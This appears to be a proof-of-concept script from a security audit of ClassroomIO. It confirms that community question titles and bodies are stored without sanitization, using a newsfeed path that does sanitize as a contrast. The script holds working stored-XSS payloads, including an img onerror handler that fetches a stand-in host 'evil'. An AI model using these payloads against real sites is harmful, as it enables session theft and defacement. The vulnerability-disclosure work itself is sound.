#!/usr/bin/env python3
"""
VULN-031 (F-16) — Community title/body persisted WITHOUT server-side sanitization
(stored HTML-injection; latent stored XSS, script-exec mitigated today by CSP + client DOMPurify).

Vulnerable code (targets/classroomio/):
  * service: apps/api/src/services/community.ts:102-145 (createQuestion — title/body inserted raw)
  * query:   packages/db/src/queries/community/community.ts:199-221 (createCommunityQuestion)
  * contrast (safe sibling): apps/api/src/services/newsfeed/newsfeed.ts:108 (sanitizeHtml on write)
  * sanitizer: packages/core/src/utils/sanitize-html.ts (DOMPurify) — NOT called by community

Class: CWE-79 stored cross-site scripting (latent) / missing output-neutralization on write.

The flaw: the community create/edit paths write `title`/`body` verbatim to the DB. Every sibling
content path (newsfeed, lessons) runs `sanitizeHtml()` (server-side DOMPurify) on write; community
does not. So an attacker-supplied `<script>`/`<img onerror=...>` payload is PERSISTED intact. Today
the dashboard render path re-sanitizes with DOMPurify and the CSP has no 'unsafe-inline' in
script-src, so script execution is mitigated — this is stored HTML-injection now, and live stored
XSS on any consumer that renders the raw column without DOMPurify (SSR, email/PDF/export, an API
client, or a future CSP relaxation).

Exploitation idea: post a community question carrying a script/onerror payload; show the DB stored
it byte-for-byte, and contrast with the newsfeed path which strips the identical payload.

A successful run proves: the community write path stores dangerous HTML unsanitized (server side),
diverging from the newsfeed path which neutralizes the same input — a real, output-agnostic defect.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (log, banner, verdict, admin_login, make_student,  # noqa: E402
                     create_course, ORG_ID, rid, psql)

VULN = "VULN-031"
HERE = os.path.dirname(os.path.abspath(__file__))


def free_seats(profile_ids):
    """Archive org-membership for the test students THIS run created (keeps the Free-plan
    20-student seat count bounded). Only touches ids created here."""
    ids = ",".join(f"'{p}'" for p in profile_ids if p)
    if not ids:
        return
    psql(f"update organizationmember set status='ARCHIVED', status_changed_at=now() "
         f"where organization_id='{ORG_ID}' and role_id=3 and profile_id in ({ids});")
    log("INFO", f"cleanup: archived {len([p for p in profile_ids if p])} test-student seat(s) created this run")


def main():
    banner(VULN, "Community title/body stored unsanitized (latent stored XSS)")
    log("INFO", "community.ts:102-145 inserts title/body verbatim; newsfeed.ts:108 calls sanitizeHtml")

    log("SETUP", "admin login + provision a STUDENT (self-registered org member)")
    admin = admin_login()
    student, info = make_student(admin)
    course_id = info["course_id"]
    log("SETUP", f"student profile={info['user_id']} course={course_id}")

    marker = rid("xss")
    # A payload with BOTH a script element and an onerror handler — the two canonical stored-XSS carriers.
    payload_body = f'<script>alert("{marker}")</script><img src=x onerror="fetch(\'//evil/{marker}\')"><b>{marker}</b>'
    payload_title = f'<img src=x onerror=alert("{marker}")>'
    slug = rid("xss-post")

    # --- Community write (the vulnerable path) ---
    q = {
        "slug": slug,
        "title": payload_title,
        "body": payload_body,
        "courseId": course_id,
        "organizationId": ORG_ID,
        "authorProfileId": info["user_id"],
        "votes": 0,
    }
    log("STEP", f"POST /community with <script>/onerror payload in title+body (slug={slug})")
    r = student.post("/community", org=True, json=q)
    log("INFO", f"  response: HTTP {r.status_code} {r.text[:150]}")
    with open(os.path.join(HERE, "request.http"), "w") as f:
        import json as _j
        f.write("POST /community HTTP/1.1\nHost: localhost:21527\nContent-Type: application/json\n")
        f.write(f"cio-org-id: {ORG_ID}\nCookie: classroomio.session_token=<STUDENT session>\n\n")
        f.write(_j.dumps(q, indent=2) + "\n")
    if r.status_code != 201:
        verdict(VULN, "FAILED", f"POST /community returned {r.status_code}")
        sys.exit(1)

    db_body = psql(f"select body from community_question where slug='{slug}';") or ""
    db_title = psql(f"select title from community_question where slug='{slug}';") or ""
    log("PROOF", f"DB community_question.body = {db_body!r}")
    log("PROOF", f"DB community_question.title = {db_title!r}")
    community_raw = ("<script>" in db_body) and ("onerror" in db_body) and ("onerror" in db_title)

    # --- Contrast: newsfeed write sanitizes the IDENTICAL payload ---
    log("STEP", "contrast: admin posts the SAME payload to a course newsfeed (which calls sanitizeHtml)")
    nf_course = create_course(admin, title=f"nf {rid('c')}")
    nf = {"courseId": nf_course["id"], "content": payload_body}
    rn = admin.post(f"/course/{nf_course['id']}/newsfeed", org=True, json=nf)
    log("INFO", f"  newsfeed create: HTTP {rn.status_code} {rn.text[:150]}")
    nf_sanitized = False
    db_nf = None
    if rn.status_code == 201:
        feed_id = rn.json().get("data", {}).get("id")
        db_nf = psql(f"select content from course_newsfeed where id='{feed_id}';") or ""
        log("PROOF", f"DB course_newsfeed.content = {db_nf!r}")
        nf_sanitized = ("<script>" not in db_nf) and ("onerror" not in db_nf)

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"community POST /community slug={slug} -> HTTP {r.status_code}\n")
        f.write(f"DB community_question.title = {db_title!r}\n")
        f.write(f"DB community_question.body  = {db_body!r}\n\n")
        f.write(f"contrast newsfeed content stored = {db_nf!r}\n")

    free_seats([info["user_id"]])

    if community_raw and nf_sanitized:
        log("PROOF", "community stored <script>+onerror VERBATIM, while the newsfeed path stripped the "
                     "identical payload — server-side sanitization is missing ONLY on the community write")
        verdict(VULN, "CONFIRMED",
                "community title/body stored unsanitized (raw <script>/onerror); newsfeed sanitizes same input. "
                "Script-exec mitigated today by CSP+DOMPurify render → stored HTML-injection / latent XSS")
        log("OK", "confirmed — stored unsanitized HTML on the community write path (latent stored XSS)")
        sys.exit(0)

    if community_raw and not nf_sanitized:
        # Still the core defect (community stores raw); contrast just didn't land.
        log("PROOF", "community stored the payload verbatim (unsanitized) — the write-path defect holds")
        verdict(VULN, "CONFIRMED",
                "community title/body stored unsanitized (raw <script>/onerror persisted); latent stored XSS")
        log("OK", "confirmed — community stores raw HTML unsanitized")
        sys.exit(0)

    verdict(VULN, "FAILED", f"community_raw={community_raw} nf_sanitized={nf_sanitized}")
    log("FAIL", "community body was not stored raw (a sanitizer may have been added)")
    sys.exit(1)


if __name__ == "__main__":
    main()
